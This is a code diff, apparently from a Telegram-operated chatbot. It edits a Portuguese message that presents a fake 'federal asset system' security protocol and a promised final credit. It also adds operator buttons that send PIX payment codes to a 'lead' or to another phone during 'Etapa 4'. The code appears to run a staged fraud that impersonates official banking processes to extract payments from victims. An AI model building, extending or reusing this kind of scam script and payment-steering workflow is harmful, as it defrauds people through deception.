@@ -377,12 +377,12 @@ Prezado(a) Titular,
 Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.
 
 🖥️ *STATUS DO SISTEMA:*
-```
+\`\`\`
 ID: #SVR-PROT-OK
 STATUS: PRONTO_PARA_USO
 TYPE: CHAVE_HASH_CRIPTOGRAFADA
 VINCULO: ATIVO
-```
+\`\`\`
 
 ✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.
 
@@ -960,7 +960,18 @@ setInterval(async () => {
                 await notifyTelegram(
                     `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
                     undefined,
-                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
+                    {
+                      inline_keyboard: [
+                        [
+                          { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${chatId}` },
+                          { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${chatId}` }
+                        ],
+                        [
+                          { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${chatId}` },
+                          { text: "❌ Cancelar", callback_data: "painel:back" }
+                        ]
+                      ]
+                    }
                 );
             } else if (etapa === 5) {
                 if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
